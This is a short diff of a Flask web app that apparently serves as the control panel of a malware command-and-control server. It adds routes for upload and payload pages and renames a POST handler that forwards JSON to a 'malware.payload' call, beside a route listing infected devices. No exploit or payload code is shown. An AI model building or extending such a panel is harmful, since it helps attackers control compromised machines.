@@ -11,6 +11,14 @@ malware = C2(sio)
 def index():
     return render_template("index.html")
 
+@app.route("/files")
+def upload():
+    return render_template("upload.html")
+
+@app.route("/payload")
+def payload():
+    return render_template("payload.html")
+
 @app.route('/terminal/<path:path>')
 def terminal(path):
     devices = malware.list_devices()
@@ -63,7 +71,7 @@ def ctrl():
     return ""
 
 @app.route('/payload', methods=['POST'])
-def payload():
+def payload1():
     data = request.get_json()
     malware.payload(data)
     return ""
